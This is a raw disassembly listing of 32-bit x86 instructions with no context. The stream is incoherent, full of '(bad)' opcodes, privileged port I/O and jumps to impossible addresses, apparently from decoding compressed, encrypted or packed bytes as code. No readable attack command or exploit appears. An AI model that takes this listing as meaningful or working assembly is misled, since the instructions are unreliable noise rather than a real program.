  43718e:	or     esi,DWORD PTR fs:[eax]
  437191:	mov    esp,0xa31200a8
  437196:	jns    0x437119
  437198:	jge    0x43714f
  43719a:	and    ecx,ecx
  43719c:	dec    ebx
  43719d:	inc    esi
  43719e:	cmc    
  43719f:	dec    edx
  4371a0:	imul   DWORD PTR [esi-0x6799cf12]
  4371a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4371a7:	pop    ss
  4371a8:	pop    esi
  4371a9:	mov    ah,0x9
  4371ab:	add    DWORD PTR [ebp+ecx*2-0x574b652e],esp
  4371b2:	sub    edi,ecx
  4371b4:	push   ds
  4371b5:	mov    ch,0x9c
  4371b7:	lahf   
  4371b8:	xor    dh,BYTE PTR [esi-0x5f829f92]
  4371be:	inc    esp
  4371bf:	sbb    al,0x2d
  4371c1:	imul   edi,DWORD PTR [esi],0x4777a0a1
  4371c7:	add    cl,bh
  4371c9:	or     al,0x8
  4371cb:	cdq    
  4371cc:	pop    ebp
  4371cd:	sbb    cl,BYTE PTR [eax+0x2e]
  4371d0:	pop    edx
  4371d1:	cmp    BYTE PTR [ebp+0x227ea667],bh
  4371d7:	mov    eax,ds:0x5dd9d1c4
  4371dc:	add    dl,cl
  4371de:	sub    eax,0x914c5e05
  4371e3:	in     eax,dx
  4371e4:	shl    BYTE PTR [ebp+eax*2+0x6660c97c],1
  4371eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4371ec:	daa    
  4371ed:	js     0x43725e
  4371ef:	addr16 push esi
  4371f1:	ret    0xbbe6
  4371f4:	jo     0x437176
  4371f6:	out    0xac,eax
  4371f8:	stos   BYTE PTR es:[edi],al
  4371f9:	aam    0xfc
  4371fb:	mov    esi,ecx
  4371fd:	into   
  4371fe:	dec    ecx
  4371ff:	xchg   DWORD PTR [edx],ecx
  437201:	jae    0x43724a
  437203:	push   esi
  437204:	mov    esp,0x1eaec252
  437209:	jge    0x43719f
  43720b:	mov    ebp,0xa6ee4fad
  437210:	xchg   edx,eax
  437211:	test   al,0x67
  437213:	(bad)  
  437214:	pop    ds
  437215:	int    0x27
  437217:	mov    eax,ds:0xc2f9b71c
  43721c:	repnz test eax,0x7d5e0af4
  437222:	out    0x4a,al
  437224:	adc    al,0x11
  437226:	dec    edi
  437227:	add    al,0xfb
  437229:	push   ecx
  43722a:	iret   
  43722b:	inc    esp
  43722c:	ret    
  43722d:	mov    eax,0x7e5f502e
  437232:	inc    ebx
  437233:	xchg   eax,edi
  437235:	cli    
  437236:	in     eax,dx
  437237:	ins    DWORD PTR es:[edi],dx
  437238:	adc    esi,edx
  43723a:	dec    edx
  43723b:	or     DWORD PTR [edi-0x8aeadc0],ecx
  437241:	pusha  
  437242:	lds    esp,FWORD PTR [edx]
  437244:	push   0x3ba8007
  437249:	mov    ch,0xee
  43724b:	jmp    0xfd9de793
  437250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437251:	pop    ebp
  437252:	xchg   ebx,eax
  437253:	jmp    0xdedad2e1
  437258:	and    ecx,0x58
  43725b:	mov    bh,0x8f
  43725d:	mov    eax,0x94944c00
  437262:	daa    
  437263:	and    al,0x7d
  437265:	fild   QWORD PTR [esi]
  437267:	jp     0x4372d9
  437269:	inc    eax
  43726a:	cmc    
  43726b:	mov    ds:0xb76890c9,eax
  437270:	mov    dl,0x12
  437272:	xchg   BYTE PTR [esi+0x4d223f31],al
  437278:	bound  esp,QWORD PTR [ecx+0x2f]
  43727b:	ss loop 0x4372e3
  43727e:	sbb    bl,BYTE PTR [esi-0x78]
  437281:	pusha  
  437282:	(bad)  
  437283:	pop    eax
  437284:	(bad)  
  437285:	repz and DWORD PTR [ecx],ebx
  437288:	clc    
  437289:	shr    esi,0xcf
  43728c:	call   0xe940:0xea0c939a
  437293:	mov    al,ds:0x4835c932
  437298:	push   edi
  437299:	mov    dl,BYTE PTR [ebp+eax*2+0x5e]
  43729d:	sub    BYTE PTR [ebx-0x73c557ef],ah
  4372a3:	push   esp
  4372a4:	fs popa 
  4372a6:	xor    bl,dh
  4372a8:	ret    0x43e8
  4372ab:	lea    eax,[eax+0x2a]
  4372ae:	jmp    0x4372f6
  4372b0:	pop    ebp
  4372b1:	(bad)  
  4372b2:	aaa    
  4372b3:	jno    0x437330
  4372b5:	mov    eax,ds:0x75df069e
  4372ba:	jbe    0x43725d
  4372bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4372bd:	sbb    BYTE PTR [eax],ah
  4372bf:	scas   al,BYTE PTR es:[edi]
  4372c0:	push   edx
  4372c1:	inc    eax
  4372c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4372c3:	fild   WORD PTR [ebx+ebx*4+0x69]
  4372c7:	xlat   BYTE PTR ds:[ebx]
  4372c8:	pop    ebp
  4372c9:	mov    dh,0x44
  4372cb:	cs jo  0x4372da
  4372ce:	inc    esi
  4372cf:	jne    0x4372c5
  4372d1:	pop    edi
  4372d2:	fstp   QWORD PTR [edx]
  4372d4:	sahf   
  4372d5:	mov    edi,0x98a25f49
  4372da:	(bad)  
  4372db:	jmp    0x437338
  4372dd:	in     eax,dx
  4372de:	outs   dx,DWORD PTR ds:[esi]
  4372df:	mov    bl,0xdc
  4372e1:	enter  0x8f8e,0xad
  4372e5:	pop    ecx
  4372e6:	or     edi,DWORD PTR [ebp+0x18]
  4372e9:	mov    ch,0xab
  4372eb:	mov    ds:0x7875d3d,eax
  4372f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4372f1:	sub    dl,BYTE PTR [esi+0x62b3692c]
  4372f7:	add    eax,0x3f7d035e
  4372fc:	push   esi
  4372fd:	adc    BYTE PTR [edi+0x3f613d73],ch
  437303:	fdivr  DWORD PTR [eax+0x6c]
  437306:	and    BYTE PTR [edi+0x1c],ah
  437309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43730a:	out    dx,al
  43730b:	mov    ds:0x72ffbfed,eax
  437310:	ins    DWORD PTR es:[edi],dx
  437311:	lea    ebp,[edi+0x8cae1a7]
  437317:	std    
  437318:	xor    DWORD PTR [ebx],esp
  43731a:	cs in  al,dx
  43731c:	cs xor al,0x92
  43731f:	ins    BYTE PTR es:[edi],dx
  437320:	arpl   di,cx
  437322:	xor    eax,0x5edebbb5
  437327:	fadd   DWORD PTR [esi+0xb]
  43732a:	inc    ebx
  43732b:	mov    eax,ds:0xd4c21da9
  437330:	(bad)  
  437331:	fisub  WORD PTR [edi+esi*8]
  437334:	xor    al,ch
  437336:	enter  0x5efb,0x24
  43733a:	xchg   esi,eax
  43733b:	(bad)  [ebp-0x15913475]
  437341:	pusha  
  437342:	(bad)  
  437343:	sbb    dl,cl
  437345:	test   BYTE PTR [ebp+0x31],dh
  437348:	stc    
  437349:	outs   dx,BYTE PTR ds:[esi]
  43734a:	add    al,BYTE PTR [edx-0x72]
  43734d:	mov    gs,WORD PTR [esi-0x384dfde9]
  437353:	pop    ebx
  437354:	pop    esp
  437355:	popa   
  437356:	jns    0x43739c
  437358:	shl    DWORD PTR [ebx-0x61],cl
  43735b:	mov    edi,0x3eee3ffa
  437360:	push   0xe
  437362:	fdiv   QWORD PTR [ebx-0x26]
  437365:	fucom  st(3)
  437367:	mov    al,ds:0x49b2364e
  43736c:	stc    
  43736d:	ja     0x43736e
  43736f:	push   cs
  437370:	pop    esi
  437371:	retf   
  437372:	mov    ah,ch
  437374:	or     dh,BYTE PTR ds:0x60b0cb7a
  43737a:	data16 aam 0x0
  43737d:	add    DWORD PTR [eax-0x110f0bc7],edx
  437383:	sbb    DWORD PTR ds:0xc11c64df,ebx
  437389:	adc    al,0xc1
  43738b:	mov    al,ds:0xf4c306f8
  437390:	adc    eax,ebp
  437392:	in     al,dx
  437393:	mov    ds,WORD PTR [edi+0x1f]
  437396:	shl    DWORD PTR [eax-0x2],1
  437399:	mov    BYTE PTR [ebx+0xc],0x34
  43739d:	cdq    
  43739e:	cdq    
  43739f:	int    0x4e
  4373a1:	popa   
  4373a2:	push   cs
  4373a3:	dec    edx
  4373a4:	mov    edi,0x67782d7d
  4373a9:	inc    eax
  4373aa:	out    dx,al
  4373ab:	mov    WORD PTR [ecx],fs
  4373ad:	and    ch,ch
  4373af:	dec    edi
  4373b0:	and    al,0x6a
  4373b2:	cli    
  4373b3:	jb     0x43735c
  4373b5:	test   al,0xaf
  4373b7:	mov    eax,ds:0xd484c2a5
  4373bc:	retf   0x744e
  4373bf:	pop    ebp
  4373c0:	jo     0x4373c8
  4373c2:	add    ah,BYTE PTR ds:0x34801cf4
  4373c8:	sahf   
  4373c9:	inc    esi
  4373ca:	adc    dl,bl
  4373cc:	pop    ecx
  4373cd:	mov    cs,WORD PTR [ebp+eiz*4+0x5549ba4]
  4373d4:	and    ah,cl
  4373d6:	jp     0x4373c4
  4373d8:	into   
  4373d9:	dec    esi
  4373da:	out    dx,al
  4373db:	mov    eax,ds:0x37b90129
  4373e0:	cwde   
  4373e1:	mov    al,0xaa
  4373e3:	mov    al,ds:0xe676de23
  4373e8:	rsm    
  4373ea:	add    eax,0xee8cf3ee
  4373ef:	pop    ebp
  4373f0:	adc    DWORD PTR ds:0x374171bf,eax
  4373f6:	std    
  4373f7:	mov    al,ds:0x7d275716
  4373fc:	aam    0x50
  4373fe:	jno    0x437467
  437400:	pop    esi
  437401:	xor    dl,BYTE PTR [ebx-0x34267245]
  437407:	mov    dl,0xd6
  437409:	inc    ecx
  43740a:	std    
  43740b:	lds    edi,FWORD PTR [ebx+0x4652b299]
  437411:	popa   
  437412:	rcr    DWORD PTR [edx-0x2411c762],0xbc
  437419:	sub    BYTE PTR [edx+0x59cdf516],bh
  43741f:	mov    eax,ds:0x1dd5e5a6
  437424:	xchg   edi,eax
  437425:	imul   ebp,DWORD PTR [esi+edx*8],0xe491a360
  43742c:	mov    BYTE PTR [ebp+eiz*1+0x3],bh
  437430:	sbb    eax,0xb069ba41
  437435:	pusha  
  437436:	cmp    esp,0x94383482
  43743c:	bound  edx,QWORD PTR [ebx-0x13]
  43743f:	dec    edi
  437440:	mov    edx,0x270b2849
  437445:	push   esp
  437446:	inc    edx
  437447:	ret    
  437448:	xchg   ebp,eax
  437449:	pusha  
  43744a:	clc    
  43744b:	(bad)  
  43744c:	push   0xa8f56076
  437451:	aaa    
  437452:	pop    esi
  437453:	imul   ecx,DWORD PTR [edi+0x6f],0x6078aa31
  43745a:	mov    eax,ds:0xc481fe08
  43745f:	fs pop edi
  437461:	mov    BYTE PTR [ebx+ebx*8],dh
  437464:	stos   DWORD PTR es:[edi],eax
  437465:	loopne 0x437450
  437467:	sbb    BYTE PTR [ecx-0x145b960f],ah
  43746d:	add    DWORD PTR [ecx-0x79321c76],0xfffffff6
  437474:	ins    DWORD PTR es:[edi],dx
  437475:	inc    ecx
  437476:	out    dx,al
  437477:	push   ebp
  437478:	pop    eax
  437479:	jb     0x437426
  43747b:	xor    DWORD PTR [eax-0x26],0x30
  43747f:	mov    eax,ds:0x42b44617
  437484:	add    ch,BYTE PTR [ebp-0x74a1231a]
  43748a:	adc    ecx,ebx
  43748c:	push   ebp
  43748d:	addr16 pop ss
  43748f:	pop    es
  437490:	pop    ds
  437491:	popa   
  437492:	mov    al,0x12
  437494:	daa    
  437495:	cld    
  437496:	push   esp
  437497:	arpl   WORD PTR [ebp+0x1efee65],dx
  43749d:	cmp    DWORD PTR [edi+ebp*1-0xf],eax
  4374a1:	jne    0x4374df
  4374a3:	test   al,0xfd
  4374a5:	mov    ebx,0x60a63422
  4374aa:	cdq    
  4374ab:	xor    BYTE PTR [ebp-0x99710c4],0x3d
  4374b2:	add    eax,0xc66c0a61
  4374b7:	ror    esi,cl
  4374b9:	pusha  
  4374ba:	mov    ecx,0xaa5dcb6a
  4374bf:	lods   al,BYTE PTR ds:[esi]
  4374c0:	daa    
  4374c1:	add    al,0xee
  4374c3:	out    0xf2,al
  4374c5:	cs ds push esp
  4374c8:	dec    ebx
  4374c9:	cwde   
  4374ca:	nop
  4374cb:	mov    eax,ds:0x13107c2c
  4374d0:	mov    ebp,0x5e81701b
  4374d5:	pop    eax
  4374d6:	pop    ebp
  4374d7:	je     0x437490
  4374d9:	pop    edx
  4374da:	mov    ch,BYTE PTR [eax+ebx*1-0xe60fba6]
  4374e1:	pop    edi
  4374e2:	lds    eax,FWORD PTR [ecx+0x74c68859]
  4374e8:	popa   
  4374e9:	push   ds
  4374ea:	out    dx,al
  4374eb:	rol    DWORD PTR [ebx],cl
  4374ed:	xor    edx,DWORD PTR [ebx+ebx*4-0xa]
  4374f1:	out    dx,eax
  4374f2:	cmp    edx,ecx
  4374f4:	or     dl,BYTE PTR [edi+0x6076ed0e]
  4374fa:	mov    eax,ds:0x523d057f
  4374ff:	int3   
  437500:	xchg   edi,eax
  437501:	or     esp,ebp
  437503:	mov    fs,WORD PTR [edi+0x739b536c]
  437509:	and    BYTE PTR [ecx],ah
  43750b:	sbb    dh,BYTE PTR [ecx+0x5ec27863]
  437511:	cmp    al,BYTE PTR [esi-0x59]
  437514:	test   DWORD PTR [edx],esi
  437516:	push   edx
  437517:	js     0x43754c
  437519:	hlt    
  43751a:	into   
  43751b:	mov    al,ds:0x1b51a67e
  437520:	and    eax,0xf9e9a7f2
  437525:	pusha  
  437526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437527:	inc    esi
  437528:	jb     0x437531
  43752a:	icebp  
  43752b:	xchg   esi,eax
  43752c:	and    ebx,DWORD PTR [ecx-0x15b5e117]
  437532:	imul   BYTE PTR [ecx+0x5e]
  437535:	adc    DWORD PTR [esi+edi*1-0x5ea49151],0x52
  43753d:	jbe    0x43759c
  43753f:	mov    al,ds:0xbaea9028
  437544:	pop    esi
  437545:	mov    al,ds:0x116c1105
  43754a:	xor    DWORD PTR [ecx+0x45],ebp
  43754d:	icebp  
  43754e:	call   0x3387:0x366086f7
  437555:	dec    edx
  437556:	xlat   BYTE PTR ds:[ebx]
  437557:	jae    0x437502
  437559:	cmp    esi,ebp
  43755b:	rcl    DWORD PTR [eax-0x34],cl
  43755e:	fwait
  43755f:	xor    BYTE PTR [ebx+0x70f49ac0],al
  437565:	pop    edi
  437566:	jecxz  0x4375c8
  437568:	jnp    0x4375cf
  43756a:	psrad  mm0,mm2
  43756d:	mov    cl,0x9e
  43756f:	mov    WORD PTR [edi+0x51],fs
  437572:	jmp    0x437547
  437574:	dec    edx
  437575:	mov    BYTE PTR [edi-0x679f5f1d],cl
  43757b:	add    al,0xc6
  43757d:	arpl   WORD PTR [ebx+ebp*1-0x14795c31],si
  437584:	pop    esi
  437585:	mov    dl,0xb6
  437587:	and    eax,0x2caa8dfa
  43758c:	imul   esp,DWORD PTR [eax+0x4a],0x7acc16f3
  437593:	inc    esi
  437594:	add    BYTE PTR [eax+edx*2-0x44c8a141],bl
  43759b:	loop   0x4375f3
  43759d:	test   DWORD PTR [ecx+0x41],0xe6ff65db
  4375a4:	push   ecx
  4375a5:	arpl   WORD PTR [eax+0x7a4c5d24],ax
  4375ab:	icebp  
  4375ac:	jbe    0x4375be
  4375ae:	and    ch,bh
  4375b0:	dec    esp
  4375b1:	mov    eax,0xcb5f82c9
  4375b6:	xor    bl,dl
  4375b8:	into   
  4375b9:	mov    ch,cl
  4375bb:	xor    BYTE PTR [eax+0x61],cl
  4375be:	ins    DWORD PTR es:[edi],dx
  4375bf:	pop    ebp
  4375c0:	mov    WORD PTR [eax],?
  4375c2:	xchg   ebx,eax
  4375c3:	fild   WORD PTR [edx]
  4375c5:	sub    esi,ebp
  4375c7:	sub    al,0x5c
  4375c9:	imul   edi,esp,0xf9f02586
  4375cf:	mov    al,ds:0x69cc16ab
  4375d4:	pusha  
  4375d5:	aad    0x45
  4375d7:	and    eax,0xb342194b
  4375dc:	pop    esi
  4375dd:	jae    0x4375aa
  4375df:	or     esi,DWORD PTR [esi-0x2b]
  4375e2:	aas    
  4375e3:	jae    0x437587
  4375e5:	jo     0x437658
  4375e7:	mov    dh,0xda
  4375e9:	stos   BYTE PTR es:[edi],al
  4375ea:	int    0xb0
  4375ec:	pop    esi
  4375ed:	mov    al,BYTE PTR [eax]
  4375ef:	add    ecx,DWORD PTR [eax+0x759a44b8]
  4375f5:	push   ecx
  4375f6:	sahf   
  4375f7:	mov    ds:0xca0e4536,eax
  4375fc:	in     al,dx
  4375fd:	inc    ecx
  4375fe:	xchg   edx,eax
  4375ff:	add    eax,0xab5c6b5c
  437604:	push   ss
  437605:	pop    ebp
  437606:	lock mov al,ds:0xa5ac59bb
  43760c:	sbb    al,BYTE PTR [ecx+edi*4+0x79]
  437610:	pop    esi
  437611:	or     DWORD PTR fs:[edx+ebx*4-0x6],0x2c
  437617:	cdq    
  437618:	and    DWORD PTR [eax-0x5f],0xfffffff9
  43761c:	in     eax,dx
  43761d:	sar    DWORD PTR [ecx+0x41],1
  437620:	pop    eax
  437621:	gs repz pop esp
  437624:	dec    esi
  437625:	mov    bl,0xc6
  437627:	mov    eax,ds:0x9e2c4a1a
  43762c:	sahf   
  43762d:	push   esp
  43762e:	loop   0x4375d0
  437630:	dec    dh
  437632:	mov    bh,0x36
  437634:	sbb    BYTE PTR [ecx-0x36088651],0xe7
  43763b:	loope  0x4376a5
  43763d:	mov    WORD PTR [edx],?
  43763f:	adc    bl,BYTE PTR [esi-0x774044dc]
  437645:	out    dx,ax
  437647:	xchg   esi,eax
  437648:	pop    ebp
  437649:	fidivr WORD PTR [edi+0x588dfffc]
  43764f:	test   DWORD PTR [eax-0x5d341138],esp
  437655:	pop    eax
  437656:	loope  0x43768e
  437658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437659:	mov    WORD PTR [ebx],es
  43765b:	mov    eax,ds:0x344b549c
  437660:	xchg   esi,eax
  437661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437662:	add    DWORD PTR [edi-0x1c7316a2],esp
  437668:	(bad)  
  437669:	xor    eax,0x5a50d4be
  43766e:	jmp    0x4376ca
  437670:	and    DWORD PTR [ebp+0x6d],0x41
  437674:	mov    bh,BYTE PTR [esi-0x63]
  437677:	and    ebx,DWORD PTR [esi-0x33]
  43767a:	test   ecx,eax
  43767c:	xchg   edx,eax
  43767d:	mov    ds:0x5f85c86b,eax
  437682:	xchg   ebp,eax
  437683:	rcl    BYTE PTR [ebp+0x5f1f0242],1
  437689:	mov    ecx,0x955ef511
  43768e:	mov    eax,0x6ce85696
  437693:	or     DWORD PTR [eax+eiz*2-0x19],edi
  437697:	in     eax,0xfa
  437699:	jmp    0xbd8e9e26
  43769e:	and    al,0x74
  4376a0:	jae    0x43767b
  4376a2:	xchg   DWORD PTR [esi-0x4d],ebx
  4376a5:	adc    bh,ah
  4376a7:	loopne 0x437667
  4376a9:	pop    edi
  4376aa:	pusha  
  4376ab:	lea    ebp,[eax+0x1798935c]
  4376b1:	imul   ecx,DWORD PTR [eax],0x21
  4376b4:	jo     0x437667
  4376b6:	xchg   esi,eax
  4376b7:	ficomp DWORD PTR [esi-0x2a]
  4376ba:	jne    0x437709
  4376bc:	call   0x1061:0x4cc697c9
  4376c3:	jge    0x4376e6
  4376c5:	xchg   ebx,eax
  4376c6:	jno    0x43766c
  4376c8:	clc    
  4376c9:	or     ebp,esi
  4376cb:	xchg   ebp,eax
  4376cc:	fs pop edx
  4376ce:	jnp    0x4376c1
  4376d0:	dec    edx
  4376d1:	imul   edx,DWORD PTR [esi-0x74d6d5f],0x6b
  4376d8:	into   
  4376d9:	out    dx,eax
  4376da:	retf   0xf10e
  4376dd:	shr    bl,0x4e
  4376e0:	inc    DWORD PTR [ecx-0x55]
  4376e3:	xchg   BYTE PTR [esi-0x6eb45840],ch
  4376e9:	pop    esp
  4376ea:	aas    
  4376eb:	inc    esi
  4376ec:	retf   
  4376ed:	mov    dh,0xb
  4376ef:	and    DWORD PTR [ecx+0x5ed4cf23],ebx
  4376f5:	outs   dx,DWORD PTR ds:[esi]
  4376f6:	xchg   ebx,eax
  4376f7:	imul   esp,DWORD PTR [edi-0x78],0x6156151e
  4376fe:	es xchg edi,eax
  437700:	inc    edx
  437701:	loop   0x43775d
  437703:	(bad)  
  437704:	mov    fs:0x21e979ee,al
  43770a:	mov    DWORD PTR [esi+eiz*4+0x3],edi
  43770e:	jmp    0x4376b5
  437710:	imul   edx,DWORD PTR [ebx-0x35],0x79a03cf1
  437717:	mov    al,ds:0xeee1bd3e
  43771c:	pop    esi
  43771d:	cmp    BYTE PTR [eax],dl
  43771f:	imul   esp,DWORD PTR [ecx-0x693c9431],0x60
  437726:	add    al,0x27
  437728:	mov    BYTE PTR [edx],cl
  43772a:	data16 arpl WORD PTR [ecx],di
  43772d:	jmp    0x98dadc20
  437732:	cs aam 0xe1
  437735:	mov    dl,0x65
  437737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437738:	mov    dl,0x18
  43773a:	scas   eax,DWORD PTR es:[edi]
  43773b:	jge    0x4376fc
  43773d:	mov    edi,0xd4f42856
  437742:	out    dx,al
  437743:	push   ss
  437744:	mov    ebp,0xed0eda88
  437749:	jae    0x43771d
  43774b:	enter  0x521,0xee
  43774f:	mov    ch,0xe0
  437751:	in     al,0xa8
  437753:	pushf  
  437754:	lahf   
  437755:	add    al,0x6
  437757:	(bad)  
  437758:	outs   dx,BYTE PTR ds:[esi]
  437759:	inc    edi
  43775a:	mov    dl,BYTE PTR [ebx+0x48b26121]
  437760:	sub    al,0xca
  437762:	dec    edx
  437763:	jae    0x437734
  437765:	push   ebp
  437766:	out    dx,al
  437767:	jnp    0x4377af
  437769:	add    BYTE PTR [esi+ebp*1],cl
  43776c:	dec    esp
  43776d:	jbe    0x43772c
  43776f:	repz cmc 
  437771:	pop    ebp
  437772:	dec    eax
  437773:	sbb    eax,0xded21a2f
  437778:	xchg   DWORD PTR [esi+0x70af646],esp
  43777e:	out    dx,al
  43777f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437780:	dec    eax
  437781:	ss pop es
  437783:	push   ebp
  437784:	pop    esp
  437785:	jne    0x43773c
  437787:	mov    ds:0x288275ac,eax
  43778c:	(bad)  
  43778d:	nop
  43778e:	dec    edi
  43778f:	aas    
  437790:	xchg   DWORD PTR [ebp-0x85a57c7],edi
  437796:	outs   dx,BYTE PTR ds:[esi]
  437797:	jns    0x4377e8
  437799:	out    0xd7,eax
  43779b:	repnz nop
  43779d:	bound  eax,QWORD PTR [esi+0x21]
  4377a0:	pop    esi
  4377a1:	pop    ecx
  4377a2:	fidivr DWORD PTR [edx]
  4377a4:	ins    DWORD PTR es:[edi],dx
  4377a5:	jnp    0x4377d3
  4377a7:	sbb    ebx,DWORD PTR [esi-0x62]
  4377aa:	sahf   
  4377ab:	pusha  
  4377ac:	jmp    0x4129e173
  4377b1:	popa   
  4377b2:	and    BYTE PTR [edi],dh
  4377b4:	push   cs
  4377b5:	pop    eax
  4377b6:	shr    ebp,1
  4377b8:	ja     0x437793
  4377ba:	out    dx,al
  4377bb:	add    bl,BYTE PTR fs:[ebx+eax*2+0x53]
  4377c0:	mov    al,ds:0xcea1a551
  4377c5:	test   DWORD PTR ds:[ecx-0x50],edx
  4377c9:	aaa    
  4377ca:	and    eax,0x3dda5f32
  4377cf:	fidivr WORD PTR [esi-0xd9e8d6f]
  4377d5:	call   0xbbbd517a
  4377da:	call   FWORD PTR [ecx]
  4377dc:	mov    eax,ds:0x1b8f2420
  4377e1:	sar    BYTE PTR gs:[edx-0x1dad42a2],cl
  4377e8:	push   ebp
  4377e9:	jns    0x4377f8
  4377eb:	ins    BYTE PTR es:[edi],dx
  4377ec:	int    0x60
  4377ee:	idiv   DWORD PTR [eax]
  4377f0:	pop    ds
  4377f1:	cmc    
  4377f2:	add    eax,esp
  4377f4:	dec    edi
  4377f5:	cmp    edi,esp
  4377f7:	nop
  4377f8:	lods   eax,DWORD PTR ds:[esi]
  4377f9:	mov    DWORD PTR ds:0x1e5bab3c,ebp
  4377ff:	adc    edx,DWORD PTR [ecx+0x4c]
  437802:	pop    esi
  437803:	mov    ds:0x3713c762,al
  437808:	int    0x1a
  43780a:	ja     0x437861
  43780c:	mov    al,0x1
  43780e:	out    dx,al
  43780f:	cmp    DWORD PTR [ebx-0x6d656f55],ecx
  437815:	cwde   
  437816:	mov    dh,0xa0
  437818:	ret    0xc840
  43781b:	mov    dh,0x57
  43781d:	dec    ebp
  43781e:	jno    0x437881
  437820:	pop    esi
  437821:	dec    esp
  437822:	pop    edx
  437823:	mov    cl,0x8d
  437825:	sub    eax,0x6071ccd2
  43782a:	adc    BYTE PTR [ecx],dl
  43782c:	xchg   ecx,eax
  43782d:	test   BYTE PTR [esi],0x5f
  437830:	cwde   
  437831:	or     DWORD PTR [edx-0x37],esp
  437834:	pusha  
  437835:	sub    BYTE PTR [ebx+0x18],0x66
  437839:	mov    BYTE PTR [ecx],0xe1
  43783c:	je     0x43780d
  43783e:	pop    esi
  43783f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437840:	inc    edi
  437841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437842:	int    0x43
  437844:	into   
  437845:	mov    al,ds:0x5955e3ca
  43784a:	out    dx,al
  43784b:	adc    esi,ecx
  43784d:	shl    DWORD PTR [esi+edx*1-0x34],1
  437851:	jbe    0x43782b
  437853:	mov    al,ds:0x81f881a2
  437858:	imul   ebx,DWORD PTR [esi+0x16],0xfffffff1
  43785c:	pop    esi
  43785d:	adc    cl,BYTE PTR [edx-0x4d]
  437860:	jmp    0x4378a0
  437862:	lods   eax,DWORD PTR ds:[esi]
  437863:	es pop ss
  437865:	mov    ds:0x809da12f,eax
  43786a:	(bad)  
  43786b:	lds    eax,FWORD PTR [esi-0x72]
  43786e:	les    edi,FWORD PTR [ecx-0x2]
  437871:	jne    0x4377f7
  437873:	sti    
  437874:	outs   dx,DWORD PTR ds:[esi]
  437875:	inc    eax
  437876:	cdq    
  437877:	mov    eax,ds:0xd901c054
  43787c:	pop    es
  43787d:	cmp    al,0x97
  43787f:	sbb    BYTE PTR [esi-0x68],bl
  437882:	sub    al,0xcc
  437884:	dec    edx
  437885:	les    ebx,FWORD PTR [ebx+eax*4+0x56]
  437889:	popa   
  43788a:	lds    ebp,FWORD PTR [ebx]
  43788c:	jb     0x437814
  43788e:	xor    bh,bh
  437890:	add    BYTE PTR [edi-0xe699f19],dl
  437896:	(bad)  
  437897:	outs   dx,DWORD PTR ds:[esi]
  437898:	fs dec ch
  43789b:	mov    ebx,0x593b85f4
  4378a0:	imul   eax,DWORD PTR [ebx-0x8],0x808983a1
  4378a7:	mov    bl,0xc8
  4378a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4378aa:	sahf   
  4378ab:	sti    
  4378ac:	outs   dx,BYTE PTR ds:[esi]
  4378ad:	nop
  4378ae:	mov    dl,0xa8
  4378b0:	xor    al,dl
  4378b2:	outs   dx,BYTE PTR ds:[esi]
  4378b3:	arpl   WORD PTR [ebx-0x55b290c8],bp
  4378b9:	xchg   ebp,eax
  4378ba:	jle    0x437875
  4378bc:	dec    esp
  4378bd:	cmp    ebx,DWORD PTR [ebx]
  4378bf:	loopne 0x43791f
  4378c1:	mov    eax,0x448103a3
  4378c6:	icebp  
  4378c7:	mov    al,ds:0x6d93e558
  4378cc:	loop   0x437899
  4378ce:	(bad)  
  4378cf:	cld    
  4378d0:	pop    esi
  4378d1:	cmp    al,0xae
  4378d3:	iret   
  4378d4:	mov    ebx,0xf7ef2138
  4378d9:	bound  esp,QWORD PTR [edx]
  4378db:	test   eax,0xe4f073b3
  4378e0:	icebp  
  4378e1:	inc    eax
  4378e2:	mov    DWORD PTR [edi],0x22602109
  4378e8:	mov    ch,0xb4
  4378ea:	out    dx,al
  4378eb:	shr    BYTE PTR [edi-0xc],cl
  4378ee:	mov    BYTE PTR [esi-0x5bd418fd],bl
  4378f4:	jle    0x43789e
  4378f6:	xchg   esp,eax
  4378f7:	sbb    ebp,DWORD PTR [edi]
  4378f9:	mov    ds:0x8e944476,eax
  4378fe:	out    dx,al
  4378ff:	jb     0x4378fe
  437901:	add    bh,BYTE PTR [ecx+0x768fc312]
  437907:	jns    0x437941
  437909:	sub    al,0x69
  43790b:	mov    eax,ds:0xeedbaf8
  437910:	inc    ebp
  437911:	mov    ds:0xbd5fedc5,al
  437916:	leave  
  437917:	cmc    
  437918:	xchg   ebp,eax
  437919:	jmp    0xa9e0:0xe54a78ad
  437920:	pop    edi
  437921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437922:	inc    edx
  437923:	shl    DWORD PTR [edi-0x6e],1
  437926:	test   BYTE PTR [eax+0x1bb1ee5e],dl
  43792c:	push   ds
  43792d:	push   ebx
  43792e:	add    BYTE PTR [edx],dl
  437930:	ficom  WORD PTR [edi+edi*1+0x66629ea4]
  437937:	push   ebx
  437938:	sar    DWORD PTR [ebp-0x11],cl
  43793b:	mov    al,ds:0x62cb465d
  437940:	dec    edx
  437941:	fs pop ebp
  437943:	ja     0x4379a3
  437945:	daa    
  437946:	pop    esp
  437947:	fwait
  437948:	inc    ebp
  437949:	push   0xffffffb7
  43794b:	outs   dx,BYTE PTR ds:[esi]
  43794c:	mov    WORD PTR [eax+0x71],fs
  43794f:	lea    edx,[ebx]
  437951:	jmp    0xd4c1f84b
  437956:	out    dx,al
  437957:	arpl   WORD PTR [ebp-0x5b3291c],dx
  43795d:	and    edi,DWORD PTR [edx-0x5f]
  437960:	xchg   ecx,eax
  437961:	fdivr  DWORD PTR [ebx]
  437963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437964:	ror    dl,0x13
  437967:	xchg   BYTE PTR [esi],dh
  437969:	iret   
  43796a:	popa   
